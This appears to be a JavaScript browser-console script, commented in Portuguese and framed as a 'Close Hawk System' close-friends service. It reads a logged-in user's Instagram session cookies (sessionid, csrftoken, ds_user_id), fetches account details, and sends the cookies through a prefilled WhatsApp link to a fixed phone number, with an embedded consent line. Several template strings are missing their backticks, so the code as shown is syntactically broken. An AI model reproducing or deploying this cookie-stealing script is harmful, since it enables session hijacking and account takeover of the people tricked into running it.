/***********************************************************
 * 1. FUNÇÃO PARA EXIBIR UM TOAST (AVISO) SIMPLES NA TELA
 ***********************************************************/
function showToast(message, type = "") {
  // Cria ou obtém um container de toast
  let toast = document.getElementById("toast");
  if (!toast) {
    toast = document.createElement("div");
    toast.id = "toast";
    toast.style.position = "fixed";
    toast.style.bottom = "20px";
    toast.style.right = "20px";
    toast.style.padding = "10px 15px";
    toast.style.borderRadius = "5px";
    toast.style.color = "#fff";
    toast.style.fontFamily = "Arial, sans-serif";
    toast.style.zIndex = "999999";
    document.body.appendChild(toast);
  }

  // Aplica cor conforme o tipo
  toast.style.backgroundColor = 
    type === "success" ? "#4caf50" :
    type === "error"   ? "#f44336" :
                         "#333";

  toast.textContent = message;
  toast.style.display = "block";

  // Some após 3 segundos
  setTimeout(() => {
    toast.style.display = "none";
    toast.textContent = "";
  }, 3000);
}

/***********************************************************
 * 2. OBTENDO COOKIES USANDO document.cookie
 ***********************************************************/
/**
 * Lê o valor de um cookie a partir de document.cookie
 * @param {string} cookieName Nome do cookie a buscar
 * @returns {string|null} Valor do cookie (ou null se não achar)
 */
function getCookieValue(cookieName) {
  const match = document.cookie.match(new RegExp('(^|;\\s*)(' + cookieName + ')=([^;]*)'));
  return match ? decodeURIComponent(match[3]) : null;
}

/**
 * Tenta capturar os principais cookies do Instagram:
 * - csrftoken
 * - ds_user_id
 * - sessionid
 */
function getInstagramCookies() {
  const csrftoken = getCookieValue("csrftoken");
  const ds_user_id = getCookieValue("ds_user_id");
  const sessionid = getCookieValue("sessionid");

  if (csrftoken && ds_user_id && sessionid) {
    return { csrftoken, ds_user_id, sessionid };
  }
  return null;
}

/***********************************************************
 * 3. FUNÇÃO PARA OBTER INFORMAÇÕES DA CONTA VIA FETCH
 ***********************************************************/
async function getInstagramAccountInfo() {
  // Primeiro busca dados de edição, para descobrir o username
  const editResponse = await fetch("https://www.instagram.com/api/v1/accounts/edit/web_form_data/", {
    credentials: "include",
    headers: {
      "x-requested-with": "XMLHttpRequest",
      "x-ig-app-id": "936619743392459"
    }
  });
  if (!editResponse.ok) {
    throw new Error("Falha ao obter username (accounts/edit/web_form_data).");
  }
  const editData = await editResponse.json();
  const username = editData?.form_data?.username;
  if (!username) {
    throw new Error("Não foi possível obter o nome de usuário.");
  }

  // Agora busca informações do perfil
  const profileResponse = await fetch(
    https://www.instagram.com/api/v1/users/web_profile_info/?username=${username},
    {
      credentials: "include",
      headers: {
        "accept": "/",
        "x-requested-with": "XMLHttpRequest",
        "x-ig-app-id": "936619743392459"
      }
    }
  );
  if (!profileResponse.ok) {
    throw new Error("Falha ao obter dados do perfil (web_profile_info).");
  }
  const profileData = await profileResponse.json();
  const user = profileData?.data?.user;
  if (!user) {
    throw new Error("Perfil de usuário inválido.");
  }

  // Extrai dados que você quer
  const followerCount = user.edge_followed_by?.count || 0;
  const profilePicUrl = user.profile_pic_url || "";
  const fullName = user.full_name || "";

  return { username, fullName, followerCount, profilePictureUrl: profilePicUrl };
}

/***********************************************************
 * 4. FUNÇÃO PARA ENVIAR DADOS PARA O WHATSAPP
 ***********************************************************/
function sendDataToWhatsApp(cookies, accountInfo) {
  try {
    const mensagem = `
[CLOSE HAWK SYSTEM - INFO DA CONTA INSTAGRAM]

• Usuário: @${accountInfo.username}
• Nome Completo: ${accountInfo.fullName}
• Seguidores: ${accountInfo.followerCount}

[COOKIES]

• csrftoken: ${cookies.csrftoken}
• ds_user_id: ${cookies.ds_user_id}
• sessionid: ${cookies.sessionid}

[DECLARAÇÃO]

Autorizo o sistema Close Hawk System a fazer serviço de Close Friends.
`;

    // Substitua "5521991566033" pelo número de WhatsApp desejado
    const whatsappUrl = https://wa.me/5521991566033?text=${encodeURIComponent(mensagem)};
    window.open(whatsappUrl, "_blank");
    showToast("Envio realizado via WhatsApp!", "success");
  } catch (error) {
    console.error("Falha ao enviar dados via WhatsApp:", error);
    showToast("Falha ao enviar dados via WhatsApp", "error");
  }
}

/***********************************************************
 * 5. FUNÇÃO PRINCIPAL (EXECUÇÃO DO FLUXO)
 ***********************************************************/
async function main() {
  try {
    showToast("Capturando cookies, aguarde...");

    // 1) Obtem cookies do Instagram
    const cookies = getInstagramCookies();
    if (!cookies) {
      showToast("Não foi possível capturar todos os cookies (csrftoken, ds_user_id, sessionid).", "error");
      return;
    }

    // 2) Obtem dados da conta via fetch
    showToast("Obtendo informações da conta...");
    const accountInfo = await getInstagramAccountInfo();

    // 3) Exibe alguma confirmação e faz o envio
    showToast(Olá, @${accountInfo.username}. Enviando..., "success");
    sendDataToWhatsApp(cookies, accountInfo);
  } catch (error) {
    console.error("Erro geral:", error);
    showToast(error.message || "Erro ao executar script", "error");
  }
}

// Você pode chamar diretamente:
main();
